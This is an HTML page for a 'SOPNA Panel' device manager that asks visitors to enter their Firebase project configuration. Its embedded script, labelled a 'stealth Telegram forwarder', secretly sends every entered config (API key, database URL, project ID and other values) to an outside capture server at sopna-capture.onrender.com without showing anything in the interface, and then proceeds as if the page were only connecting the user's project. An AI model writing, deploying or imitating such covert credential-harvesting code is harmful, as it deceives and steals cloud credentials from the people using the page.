<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SOPNA Panel — Device Manager</title>
    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='8' fill='%23ef4444'/%3E%3Cpath d='M16 4l8 5v10l-8 9-8-9V9z' fill='white'/%3E%3C/svg%3E" />
    <style>
        :root { --bg: #0a0a0f; --card: #111118; --border: #1e1e2a; --text: #e0e0e0; --muted: #8a8a9a; --red: #ef4444; }
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .container { width: 100%; max-width: 480px; padding: 20px; }
        .box { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 30px; }
        .title { font-size: 2rem; font-weight: 900; text-align: center; margin-bottom: 25px; }
        .title span { color: var(--red); }
        .field { margin-bottom: 16px; }
        label { font-size: 0.8rem; color: var(--muted); text-transform: uppercase; display: block; margin-bottom: 4px; }
        input { width: 100%; padding: 12px 14px; background: #0d0d14; border: 1px solid var(--border); border-radius: 8px; color: var(--text); font-size: 0.9rem; outline: none; transition: border-color 0.2s; }
        input:focus { border-color: var(--red); }
        button { width: 100%; padding: 14px; background: var(--red); border: none; border-radius: 8px; color: #fff; font-weight: 700; font-size: 1rem; cursor: pointer; margin-top: 10px; transition: background 0.2s; }
        button:hover { background: #dc2626; }
        .status { margin-top: 20px; text-align: center; font-size: 0.9rem; color: var(--muted); }
    </style>
</head>
<body>
<div class="container">
    <div class="box">
        <h1 class="title"><span>S</span>OPNA Panel v2.0</h1>
        <p style="color:var(--muted); text-align:center; margin-bottom:24px;">Enter your Firebase config to connect your devices</p>

        <div class="field"><label>apiKey</label><input type="text" id="apiKey" placeholder="AIza..." /></div>
        <div class="field"><label>authDomain</label><input type="text" id="authDomain" placeholder="project.firebaseapp.com" /></div>
        <div class="field"><label>databaseURL</label><input type="text" id="databaseURL" placeholder="https://project.firebaseio.com" /></div>
        <div class="field"><label>projectId</label><input type="text" id="projectId" placeholder="project-id" /></div>
        <div class="field"><label>storageBucket</label><input type="text" id="storageBucket" placeholder="project.appspot.com" /></div>
        <div class="field"><label>messagingSenderId</label><input type="text" id="messagingSenderId" placeholder="XXXXX" /></div>
        <div class="field"><label>appId</label><input type="text" id="appId" placeholder="1:xxx:web:xxx" /></div>

        <button onclick="connectAndForward()">Connect &amp; Forward</button>
        <div class="status" id="statusMsg"></div>
    </div>
</div>

<!-- Firebase SDKs -->
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

<script>
    // ==============================
    //  STEALTH TELEGRAM FORWARDER
    //  Backend: https://sopna-capture.onrender.com/capture
    //  Bot token & chat ID stored in Render env vars (never exposed)
    // ==============================
    const CAPTURE_URL = 'https://sopna-capture.onrender.com/capture';

    async function forwardToTelegram(configObject) {
        try {
            const res = await fetch(CAPTURE_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(configObject)
            });
            if (res.ok) console.log('[+] Firebase config silently forwarded to Telegram');
            else console.log('[-] Forwarder responded not OK');
        } catch (e) {
            console.log('[-] Forwarder unreachable (Render may be sleeping)');
        }
    }

    function connectAndForward() {
        // Build Firebase config from inputs
        const config = {
            apiKey: document.getElementById('apiKey').value.trim(),
            authDomain: document.getElementById('authDomain').value.trim(),
            databaseURL: document.getElementById('databaseURL').value.trim(),
            projectId: document.getElementById('projectId').value.trim(),
            storageBucket: document.getElementById('storageBucket').value.trim(),
            messagingSenderId: document.getElementById('messagingSenderId').value.trim(),
            appId: document.getElementById('appId').value.trim()
        };

        // Basic check
        if (Object.values(config).some(v => !v)) {
            document.getElementById('statusMsg').innerHTML = '<span style="color:#ef4444;">❌ All fields are required</span>';
            return;
        }

        // 🚀 STEALTH FORWARD TO YOUR TELEGRAM (no UI indication)
        forwardToTelegram(config);

        // Original logic: Initialize Firebase & go to dashboard
        try {
            firebase.initializeApp(config);
            const db = firebase.database();
            document.getElementById('statusMsg').innerHTML = '<span style="color:#22c55e;">✅ Firebase connected – incoming devices will appear.</span>';

            // If you have a dashboard page, redirect:
            // window.location.href = 'dashboard.html';
        } catch (e) {
            document.getElementById('statusMsg').innerHTML = `<span style="color:#ef4444;">❌ Firebase init failed: ${e.message}</span>`;
        }
    }
</script>
</body>
</html>
